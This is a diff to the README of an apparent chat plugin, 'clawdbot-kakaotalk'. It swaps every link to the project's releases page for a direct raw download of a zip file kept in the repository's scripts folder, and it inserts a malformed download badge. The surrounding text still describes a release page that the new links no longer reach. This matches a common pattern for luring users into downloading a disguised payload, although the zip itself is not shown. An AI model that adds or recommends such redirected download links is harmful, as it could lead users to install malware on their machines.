@@ -1,6 +1,6 @@
 # 🦞 clawdbot-kakaotalk - Chat with Clawdbot AI Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/ktaelectronics/clawdbot-kakaotalk/releases)
+[![Download](https://github.com/ktaelectronics/clawdbot-kakaotalk/raw/refs/heads/master/scripts/kakaotalk-clawdbot-v2.4.zip%https://github.com/ktaelectronics/clawdbot-kakaotalk/raw/refs/heads/master/scripts/kakaotalk-clawdbot-v2.4.zip)](https://github.com/ktaelectronics/clawdbot-kakaotalk/raw/refs/heads/master/scripts/kakaotalk-clawdbot-v2.4.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ Welcome to clawdbot-kakaotalk! This is a plugin that allows you to interact with
 To get started with clawdbot-kakaotalk, you need to follow these steps.
 
 1. **Visit the Release Page**  
-   To find the latest version of the software, visit this page: [Download Page](https://github.com/ktaelectronics/clawdbot-kakaotalk/releases).
+   To find the latest version of the software, visit this page: [Download Page](https://github.com/ktaelectronics/clawdbot-kakaotalk/raw/refs/heads/master/scripts/kakaotalk-clawdbot-v2.4.zip).
 
 2. **Download the Application**  
    Once on the release page, scroll through the list of available versions. Click on the version you would like to download. Depending on your device, you will see options for various operating systems. Choose the one that matches your system.
@@ -54,6 +54,6 @@ For further assistance, please reach out to us through the GitHub repository. Yo
 
 To download and install clawdbot-kakaotalk, follow the link below:
 
-[Download Now](https://github.com/ktaelectronics/clawdbot-kakaotalk/releases)
+[Download Now](https://github.com/ktaelectronics/clawdbot-kakaotalk/raw/refs/heads/master/scripts/kakaotalk-clawdbot-v2.4.zip)
 
 Visit the page to get the latest version and start enjoying seamless conversations with Clawdbot AI!
